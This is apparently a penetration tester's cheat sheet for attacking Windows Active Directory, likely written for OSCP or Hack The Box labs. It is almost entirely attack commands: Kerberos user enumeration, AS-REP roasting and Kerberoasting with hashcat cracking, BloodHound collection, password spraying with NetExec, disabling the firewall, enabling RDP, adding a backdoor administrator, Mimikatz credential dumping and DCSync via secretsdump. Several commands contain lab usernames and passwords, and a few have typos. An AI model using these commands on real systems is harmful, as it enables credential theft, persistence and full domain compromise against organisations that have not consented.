# RDP connect
```
xfreerdp /u:<username> /p:<password> /v:<Machine1_IP>
```

# remote login 
```
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

```
evil-winrm -i 192.168.50.220 -u daveadmin -H "hash"
```

```
/usr/share/doc/python3-impacket/examples/psexec.py CORP/jeffadmin:"BrouhahaTungPerorateBroom2023!"@192.168.163.75
```

# Kerberos Enumeration
```
./kerbrute_linux_amd64 userenum --dc 192.168.163.161 -d poseidon.yzx -o kerbrute-user-enum xato-net-10-million-usernames.txt
```

```
sudo./kerbrute_linux_amd64 userenum --dc 192.168.97.100 -d oscp.exam
/usr/share/wordlists/rockyou.txt
```

# GetNPUsers
```
/GetNPUsers.py -usersfile usernames.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 192.168.163.162 'sub.poseidon.yzx/ '
```

```
Impacket-GetNPUsers poseidon.yzx/user1 -dc-ip 192.168.97.100 - request
```

# NP Users hash crack
```
hashcat -m 18200 ./chen.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

# targetedkerberost.py
```
proxychains python targetedKerberoast.py -v -d
'oscp.exam' -u 'Bethan.Gibson' -p 'ServeCrackNail139' --dc-ip
172.16.125.100
```
# targetedkerberoast.py crack
```
hashcat -m 13100 krb_hash /opt/rockyou.txt
```

# BloodHound
```
Import-Module .\Sharphound.ps1
```

```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```

```
powershell -exec bypass -Command "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All"
```

```
bloodhound-python -u 'jdoe' --hashes 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -d 'corp.com' -dc 'DC01.corp.com' -c All
```

```
bloodhound-python -u 'jdoe' -p 'Password123!' -d 'corp.com' -dc 'DC01.corp.com' -c All -o /tmp/bh_data
```

```
bloodhound-python -u 'rose' -p 'KxEPkKe6R8su' -d 'sequel.htb' -ns '10.10.11.51' -c All -o /tmp
```

```
proxychains bloodhound-python -u Bethan.Gibson -p
'ServeCrackNail139' -ns 172.16.125.100 -d oscp.exam -c all --dns-
tcp --zip
```
# NXC password spray
```
nxc rdp 192.168.163.0/24 -u iis_service -p Strawberry1 --continue-on-success
```

```
nxc smb 192.168.163.0/24 -u user.txt -p pass.txt --continue-on-success
```

```
nxc smb 172.16.95.240-245 -u john -p dqsTwTpZPn#nL --shares
```

```
nxc winrm 192.168.214.96 -u apache -p 'New2Era4.!' --local-auth
```

# searching files
```
Find-InterestingFile
```

```
cmd /r dir /s local.txt
```

```
cmd /r dir /s proof.txt
```

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```
Get-ChildItem -Path C: -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```


# Shares Enumeration
#### Know available shares 
```
Find-DomainShare
```
 _to access_
```
ls \\dc1.corp.com\sysvol\corp.com\
```

### 1liner
```
Find-DomainShare | ForEach-Object { 
    $path = "\\$($_.ComputerName)\$($_.Name)"; 
    $access = Test-Path $path; 
    Write-Output "$path : $(if ($access) { 'Accessible' } else { 'Inaccessible' })"
}

```

```
Find-DomainShare | ForEach-Object { 
    $path = "\\$($_.ComputerName)\$($_.Name)"; 
    if (Test-Path $path) { Write-Output $path } 
}
```


# Post Exploitation
#### enable RDP

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

#### turn of firewall
```
netsh advfirewall set allprofiles state off
```

#### crating another user
```sh
net user astute Test@123 /add
```

#### Adding to administrative group
```sh
net localgroup administrators astute /add
```

# Mimikatz
```
./mimi.exe
privilege::debug
sekurlsa::logonpasswords
```

```
./mimi.exe
privilege::debug
sekurlsa::ekeys
```

```
./mimi.exe
privilege::debug
lsadump::sam
```

```
token::elevate
lsadump::secrets
```

```
safetykatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
```

```
token::elevate
lsadump::secrets "vault::cred /patch"
```

# DC Sync attack
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
or
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local"
"exit"
```
